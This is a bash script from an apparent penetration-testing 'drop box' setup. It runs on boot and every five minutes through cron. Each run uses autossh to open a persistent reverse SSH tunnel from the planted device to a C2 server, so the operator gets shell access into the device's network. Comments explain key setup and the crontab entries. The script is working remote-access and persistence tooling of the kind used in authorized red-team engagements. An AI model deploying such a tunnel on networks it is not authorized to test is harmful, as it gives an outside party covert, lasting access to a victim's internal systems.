#!/bin/bash

# Details
# This script is configured to run on boot and every 5 mins. It will create a reverse SSH tunnel to a C2 box which can be accessed from the C2 by
# ssh -p [REVSSH_C2_LOCALPORT] kali@localhost
# Ref: https://artificesecurity.com/blog/2019/8/6/how-to-build-your-own-penetration-testing-drop-box-using-a-raspberry-pi-4


# Setup
# 1. create an ssh key on the dropbox for user kali.
# 2. insert pubkey into the authorized_keys file on the C2 box
# 3. configure /opt/dropbox/config.txt 
# 4. enable/disable with $REVSSH_ENABLED=1 or 0


# crontab information
# sudo crontab -e and paste the following (should already be configured)
# @reboot sleep 5 && /opt/dropbox/revssh/autossh-connect.sh > /dev/null 2>&1
# */5 * * * * /opt/dropbox/revssh/autossh-connect.sh > /dev/null 2>&1

source /opt/dropbox/config.txt

if [ "$REVSSH_ENABLED" -eq 1 ]; then
	echo "$REVSSH_ENABLED found creating SSH tunnel."
	echo "[!] - revssh - $(date) - $REVSSH_ENABLED found, creating SSH tunnel" >> $REVSSH_LOG;
	
	autossh -M 11166 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i "$REVSSH_KEYPATH" -R "$REVSSH_C2_LOCALPORT:localhost:22" "$REVSSH_C2_USER@$REVSSH_C2_IP" 2>./crash &
	
	#ssh -i "$REVSSH_KEYPATH" -N -f -R "$REVSSH_C2_LOCALPORT:localhost:22" "$REVSSH_C2_USER@$REVSSH_C2_IP" &
	RESULT=$?
	if [ $RESULT -eq 0 ]; then
		echo "[+] - revssh - $(date) - SSH tunnel creation succeeded" >> $REVSSH_LOG
	else
		echo "[-] - revssh - $(date) - SSH tunnel creation failed!!!" >> $REVSSH_LOG
	fi
else
	echo "$ENABLED not found. bailing !!!";
	echo "[-] - revssh - $(date) - $REVSSH_ENABLED not found, bailing !!!" >> $REVSSH_LOG
fi



